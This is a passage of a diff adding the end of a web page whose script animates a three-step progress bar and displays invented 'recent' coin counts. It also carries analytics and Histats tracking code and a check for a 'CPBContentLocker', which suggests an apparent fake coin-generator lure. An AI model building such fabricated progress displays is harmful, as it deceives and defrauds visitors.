+    document.getElementById("step3").style.backgroundColor="#393b3d";
+    document.getElementById("pro-bar").style.backgroundColor="#629ad4";
+    document.getElementById("pro-bar").style.width=prostep +"%";
+    if (recentCoin==1000){
+          document.getElementById("recent-num").innerHTML=(prostep*19);
+    }
+    if (recentCoin==2500){
+          document.getElementById("recent-num").innerHTML=(prostep*48);
+    }
+    if (recentCoin==6000){
+          document.getElementById("recent-num").innerHTML=(prostep*116);
+    }
+    if (recentCoin==10000){
+          document.getElementById("recent-num").innerHTML=(prostep*192);
+    }
+
+    }
+    else if(prostep<99){
+    document.getElementById("step2").style.backgroundColor="#629ad4";
+    document.getElementById("pro-bar").style.width=prostep +"%";
+    document.getElementById("recent-num").innerHTML=recentCoin;
+    }
+    else if(prostep<100){
+    document.getElementById("step1").style.backgroundColor="#32ab00";
+    document.getElementById("step2").style.backgroundColor="#32ab00";
+    document.getElementById("step3").style.backgroundColor="#32ab00";
+    document.getElementById("pro-bar").style.backgroundColor="#32ab00";
+    }
+    else if(prostep>130){
+    prostep=0;
+    random();
+    }
+    prostep++;
+    }
+
+    </script> 
+    <script>
+
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+
+
+    </script> 
+    <script type="text/javascript">
+    var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,4625930,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();
+    </script> <noscript><a href="/" target="_blank"><img src=
+    "//sstatic1.histats.com/0.gif?4625930&101" alt=
+    "counter create hit" border="0"></a></noscript>
+  </center>
+</body>
+</html>
